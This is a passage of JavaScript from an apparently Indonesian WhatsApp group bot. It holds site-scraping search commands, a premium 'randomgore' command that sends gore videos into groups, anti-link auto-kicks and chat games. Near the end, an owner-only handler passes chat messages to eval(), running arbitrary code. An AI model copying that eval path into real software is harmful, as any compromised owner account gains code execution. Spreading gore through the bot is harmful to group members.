if (args.length < 1) return reply("Nyari apa?");
        query = args.join(" ");
        scrap.wattpad(`${query}`).then((ne) => {
        	console.log(ne);
        	teks = '*「 _wattpad_ 」*'
          for (let i = 0; i < ne.length; i++) {
            teks += `\n\n*➸ Title:* ${ne[i].judul}\n*➸ Link:* ${ne[i].link}\n*➸ Image:* ${ne[i].thumb}\n*➸ Be Read:* ${ne[i].dibaca}\n*➸ Vote:* ${ne[i].divote}\n\n`;
          }
          dha.sendMessage(from, teks, text, {
            quoted: mek,
            detectLinks: false,
          });
        });
        break;
        case "gore":
case "randomgore":
if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (!isPremium) return reply(`Only Prem`)
        teks = '*「 _RAMDOM GORE_  」*'
        scrap.randomgore().then((res) => {
        	console.log(res);
        teks += `*➸ Title:* ${res.data.judul}\n*➸ Link:* ${res.data.link}\n*➸ Comment : ${res.data.comment}\n*➸ View : ${res.data.views}\n\n`
                    vid1 = `${res.data.link}`
                    sendMediaURL(from, vid1);
          dha.sendMessage(from, teks, text, {
            quoted: mek,
            detectLinks: false,
          });
        });
        break;
        case "jobs":
        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (!isPremium) return reply(`Only Prem`)
if (args.length < 1) return reply("Nyari apa?");
        query = args.join(" ");
        scrap.jobsearch(`${query}`).then((ne) => {
        	console.log(ne);
        	teks = '*「 _JOB SEARCH_ 」*'
          for (let i = 0; i < ne.length; i++) {
            teks += `\n\n*➸ Title:* ${ne[i].job}\n*➸ Link:* ${ne[i].link_Detail}\n*➸ Perusahaan:* ${ne[i].perusahaan}\n*➸ Daerah:* ${ne[i].daerah}\n*➸ Upload:* ${ne[i].upload}\n\n`;
          }
          dha.sendMessage(from, teks, text, {
            quoted: mek,
            detectLinks: false,
          });
        });
        break;
        case "layarkaca":
        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (!isPremium) return reply(`Only Prem`)
if (args.length < 1) return reply("Nyari apa?");
        query = args.join(" ");
        scrap.film(`${query}`).then((ne) => {
        	console.log(ne);
        	teks = '*「 _LAYAR KACA SEARCH_ 」*'
          for (let i = 0; i < ne.length; i++) {
            teks += `\n\n*➸ Title:* ${ne[i].judul}\n*➸ Link:* ${ne[i].link_nonton}\n*➸ Img:* ${ne[i].thumb}\n*➸ Genre:* ${ne[i].genre}\n\n`;
          }
          dha.sendMessage(from, teks, text, {
            quoted: mek,
            detectLinks: false,
          });
        });
        break;
        case "webtoons":
        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (args.length < 1) return reply("Nyari apa?");
        query = args.join(" ");
        scrap.webtoons(`${query}`).then((ne) => {
        	console.log(ne);
        	teks = '*「 _WEBTOONS_ 」*'
          for (let i = 0; i < ne.length; i++) {
            teks += `\n\n*➸ Title:* ${ne[i].judul}\n*➸ Link:* ${ne[i].link}\n*➸ Like:* ${ne[i].likes}\n*➸ Genre:* ${ne[i].genre}\n*➸ Author:* ${ne[i].author}\n\n`;
          }
          dha.sendMessage(from, teks, text, {
            quoted: mek,
            detectLinks: false,
          });
        });
        break;
        case "drakor":
        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (args.length < 1) return reply("Nyari apa?");
        query = args.join(" ");
        scrap.drakor(`${query}`).then((ne) => {
        	console.log(ne);
        	teks = '*「 _DRAKOR SEARCH_ 」*'
          for (let i = 0; i < ne.length; i++) {
            teks += `\n\n*➸ Title:* ${ne[i].judul}\n*➸ Link:* ${ne[i].link}\n*➸ Thumb:* ${ne[i].thumb}\n\n`;
          }
          dha.sendMessage(from, teks, text, {
            quoted: mek,
            detectLinks: false,
          });
        });
        break;
        case "dewabatch":
        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (args.length < 1) return reply("Nyari apa?");
        query = args.join(" ");
        scrap.dewabatch(`${query}`).then((ne) => {
        	console.log(ne);
        	teks = '*「 _DEWABATCH SEARCH_ 」*'
          for (let i = 0; i < ne.length; i++) {
            teks += `\n\n*➸ Title:* ${ne[i].judul}\n*➸ Rating:* ${ne[i].rating}\n*➸ Link:* ${ne[i].link}\n*➸ Thumb:* ${ne[i].thumb}\n\n`;
          }
          dha.sendMessage(from, teks, text, {
            quoted: mek,
            detectLinks: false,
          });
        });
        break;
        
        
        
        



default:
if(budy.includes('Putra')){
cpref = ` *Kenapa manggil orang ganteng?*`
reply(cpref)
}
if(budy.includes('pipiw')){
cpref = ` *Kenapa manggil orang cantik?*`
reply(cpref)
}
if(budy.includes('Pipiw')){
cpref = ` *Kenapa manggil orang cantik?*`
reply(cpref)
}
 if(budy.includes('putra')){
cpref = ` *Kenapa manggil orang ganteng?*`
reply(cpref)
}
if(budy.includes('Bot')){
cpref = `Kenapa?`
reply(cpref)
}
if(budy.includes('bot')){
cpref = `Kenapa?`
reply(cpref)
}

if (budy.includes("://youtube.com/")){
		if (!isGroup) return
		if (!isAntiLinkytc) return
		if (isGroupAdmins) return reply('*Admin Terdeteksi, Bot Tidak Akan Mengeluarkan Admin Grup, Karena Admin Grup Bebas Mengirimkan Link YouTube Channel*')
		dha.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`*「 Link YouTube Channel Terdeteksi 」 wa.me/${sender.split("@")[0]} Maaf Anda Di Kick.*`)
		setTimeout( () => {
			dha.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		}, 1000)
		setTimeout( () => {
			dha.updatePresence(from, Presence.composing)
reply("*「 BACA PERATURAN GC 」Selamat Tinggal Sobat, Lain kali Kalau Ada Masuk Grup Di Baca Dulu Peraturannya Ya Kak...*\n\n*Promosi wajib Izin Admin.*")
		}, 0)
	}

if (budy.includes("://youtu.be/")){
		if (!isGroup) return
		if (!isAntiLinkytv) return
		if (isGroupAdmins) return reply('*Admin Terdeteksi, Bot Tidak Akan Mengeluarkan Admin Grup, Karena Admin Grup Bebas Mengirimkan Link YouTube Video*')
		dha.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`*「 Link YouTube Video Terdeteksi 」 wa.me/${sender.split("@")[0]} Maaf Anda Di Kick.*`)
		setTimeout( () => {
			dha.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		}, 1000)
		setTimeout( () => {
			dha.updatePresence(from, Presence.composing)
reply("*「 BACA PERATURAN GC 」Selamat Tinggal Sobat, Lain kali Kalau Ada Masuk Grup Di Baca Dulu Peraturannya Ya Kak...*\n\n*Promosi Wajib izin Admin.*")
		}, 0)
	}
	
	if (budy.includes("://t.me/")){
		if (!isGroup) return
		if (!isAntiLinkTelegram) return
		if (isGroupAdmins) return reply('*Admin Terdeteksi, Bot Tidak Akan Mengeluarkan Admin Grup, Karena Admin Grup Bebas Mengirimkan Link Telegram*')
		dha.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`*「 Link Telegram Terdeteksi 」 wa.me/${sender.split("@")[0]} Maaf Anda Di Kick.*`)
		setTimeout( () => {
			dha.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		}, 1000)
		setTimeout( () => {
			dha.updatePresence(from, Presence.composing)
reply("*「 BACA PERATURAN GC 」Selamat Tinggal Sobat, Lain kali Kalau Ada Masuk Grup Di Baca Dulu Peraturannya Ya Kak...*\n\n*Promosi Link Wajib Izin Admin.*")
		}, 0)
	}
	
	if (isMuted){
 }
            
              const getWin = (userId) => {
              let position = false
              Object.keys(_win).forEach((i) => {
              if (_win[i].jid === userId) {
              position = i
       }
        })
              if (position !== false) {
              return _win[position].win
            }
        }
            

if (fs.existsSync(`./media/${from}.json`)) {
	gelutSkuy = setGelud(`${from}`)
	if (sender == `${gelutSkuy.Y}@s.whatsapp.net` && budy.toLowerCase() == 'y') {
		if (gelutSkuy.status) return reply(`Game telah dimulai sebelumnya!`)
		gelutSkuy.status = true
		rand0m = [ gelutSkuy.Z, gelutSkuy.Y ]
		winR = rand0m[Math.floor(Math.random() * rand0m.length)]
		fs.writeFileSync(`./media/${from}.json`, JSON.stringify(gelutSkuy, null, 2))
		starGame = `👑 Gelud Game 🤙🏻 

Diantara @${gelutSkuy.Z} & @${gelutSkuy.Y}
• Pemenangnya adalah [ @${winR} ] `
	   dha.sendMessage(from, starGame, text, {quoted: troli, contextInfo: { mentionedJid: [winR + "@s.whatsapp.net", gelutSkuy.Z + "@s.whatsapp.net", gelutSkuy.Y + "@s.whatsapp.net",]}})
		fs.unlinkSync("./media/" + from + ".json");
	} else if (sender == `${gelutSkuy.Y}@s.whatsapp.net` &&  budy.toLowerCase() == 'n') {
		dha.sendMessage(from, `👑 Game Gelud Rejected 🤙🏻
• @${gelutSkuy.Y} Menolak🤙🏻`, text, {quoted: troli, contextInfo: { mentionedJid: [gelutSkuy.Y + "@s.whatsapp.net"]}})
		fs.unlinkSync("./media/" + from + ".json");
	}
}

if (isTTT && isPlayer2){
if (budy.startsWith('Y')){
  tto = ky_ttt.filter(ghg => ghg.id.includes(from))
  tty = tto[0]
  angka = tto[0].angka
  ucapan = 
`*🎳 Game Tictactoe 🎲*

Player1 @${tty.player1.split('@')[0]}=❎
Player2 @${tty.player2.split('@')[0]}=⭕

Giliran = @${tty.player1.split('@')[0]}

   ${angka[1]}${angka[2]}${angka[3]}
   ${angka[4]}${angka[5]}${angka[6]}
   ${angka[7]}${angka[8]}${angka[9]}`
  dha.sendMessage(from, ucapan, text, {quoted: troli, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
  }
if (budy.startsWith('N')){
tto = ky_ttt.filter(ghg => ghg.id.includes(from))
tty = tto[0]
naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
ky_ttt = naa
dha.sendMessage(from, `Yahh @${tty.player2.split('@')[0]} Menolak:(`,text,{quoted:troli,contextInfo:{mentionedJid:[tty.player2]}})
}
}

if (isTTT && isPlayer1){
nuber = parseInt(budy)
if (isNaN(nuber)) return
if (nuber < 1 || nuber > 9) return reply('Masukan Angka Dengan Benar')
main = ky_ttt.filter(hjh => hjh.id.includes(from)) 
if (!tttawal.includes(main[0].angka[nuber])) return reply('Udah Di Isi, Isi Yang Lain Gan')
if (main[0].gilir.includes(sender)) return reply('Tunggu Giliran Gan')
s = '❎'
main[0].angka[nuber] = s
main[0].gilir = main[0].player1
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
ky_ttt = naa
pop = main[0]
ky_ttt.push(pop)
tto = ky_ttt.filter(hgh => hgh.id.includes(from))
tty = tto[0]
angka = tto[0].angka
ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`

ucapmenang = () => {
ucapan1 = 
`*🎳Result Game Tictactoe 🎲*

*Yeyyy Permainan Di Menangkan Oleh* @${tty.player1.split('@')[0]}\n
*Ingin bermain lagi? ${prefix}tictactoe*`
ucapan2 = `*🎳Result Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
dha.sendMessage(from, ucapan1, text, {quoted: troli, contextInfo:{mentionedJid: [tty.player1]}})
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}

if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()

if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()

if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()

if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()

if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()

if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()

if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()

if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()

if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && ! ttt.includes('4️⃣') && !
ttt.includes('5️⃣') && !
ttt.includes('6️⃣') && ! ttt.includes('7️⃣') && ! ttt.includes('8️⃣') && ! ttt.includes('9️⃣')){
ucapan1 = `*🎳 Result Game Tictactoe 🎲*

*_Permainan Seri ??👌_*`
ucapan2 = `*🎳 Result Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
reply(ucapan1)
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}
ucapan = `*🎳 Game Tictactoe 🎲*

Player2 @${tty.player2.split('@')[0]}=⭕
Player1 @${tty.player1.split('@')[0]}=❎

Giliran = @${tty.player2.split('@')[0]}

${ttt}`
dha.sendMessage(from, ucapan, text, {quoted: troli, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
}
if (isTTT && isPlayer2){
nuber = parseInt(budy)
if (isNaN(nuber)) return
if (nuber < 1 || nuber > 9) return reply('Masukan Angka Dengan Benar')
main = ky_ttt.filter(hjh => hjh.id.includes(from)) 
if (!tttawal.includes(main[0].angka[nuber])) return reply('Udah Di Isi, Isi Yang Lain Gan')
if (main[0].gilir.includes(sender)) return reply('Tunggu Giliran Gan')
s = '⭕'
main[0].angka[nuber] = s
main[0].gilir = main[0].player2
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
ky_ttt = naa
pop = main[0]
ky_ttt.push(pop)
tto = ky_ttt.filter(hgh => hgh.id.includes(from))
tty = tto[0]
angka = tto[0].angka
ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`

ucapmenang = () => {
ucapan1 = `*🎳 Result Game Tictactoe 🎲*

*Yeyyy Permainan Di Menangkan Oleh* @${tty.player2.split('@')[0]}\n
*Ingin bermain lagi? ${prefix}tictactoe*`
ucapan2 = `*🎳 Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
dha.sendMessage(from, ucapan1, text, {quoted:troli, contextInfo:{mentionedJid: [tty.player2]}})
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}

if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()
if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()
if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()
if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()
if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()
if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()
if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()
if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()
if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && ! ttt.includes('4️⃣') && !
ttt.includes('5️⃣') && !
ttt.includes('6️⃣') && ! ttt.includes('7️⃣') && ! ttt.includes('8️⃣') && ! ttt.includes('9️⃣')){
ucapan1 = `*🎳Result Game Tictactoe 🎲*

*_Permainan Seri🗿👌*`
ucapan2 = `*🎳 Result Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
reply(ucapan1)
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}
ucapan = `*🎳 Game Tictactoe 🎲*

Player1 @${tty.player1.split('@')[0]}=⭕
Player2 @${tty.player2.split('@')[0]}=❎
   
Giliran = @${tty.player1.split('@')[0]}

${ttt}`
 dha.sendMessage(from, ucapan, text, {quoted: troli, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
} else {
}
if (budy.startsWith('>')){
if (!mek.key.fromMe && !isOwner) return
try {
return dha.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})
} catch(err) {
e = String(err)
reply(e)
}
}
if (!isOwner) return
if (budy.startsWith('+')) {
try {
console.log(color('[ EVAL ]', 'pink'), color(time), budy, color('dari', 'yellow'), pushname, color('di'), isGroup ? groupName : 'Private Chat')
reply(require('util').format(eval(`;(async () => { ${budy.slice(2)} })()`)))
} catch(e) {
console.log(e)
err = String(e)
js = JSON.stringify(e, null, 2)
if (js == '{}') js = { err }
js = JSON.stringify(js, null, 2)
js = '```' + js + '```'
reply('_' + err + '_\n\n' + js)
}
}
if (!isGroup && isCmd && !mek.key.fromMe){
teks = `Maaf @${senderr.split('@')[0]}, command ${prefix + command} tidak ada dalam menu`
dha.sendMessage(from, {text:teks, jpegThumbnail:fs.readFileSync('./media/canss.jpg')}, 'extendedTextMessage', {sendEphemeral:true, quoted:mek, contextInfo:{ forwardingScore:508, isForwarded:true, mentionedJid:[senderr]}})
}
	} 
if (isGroup && budy != undefined) {
} else {
console.log('[',color('TEXT','teal'),']',`Message : ${budy} From`, color(pushname))
}		
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero")) {
	console.log('Message : %s', color(e, 'green'))
        }
	}
}



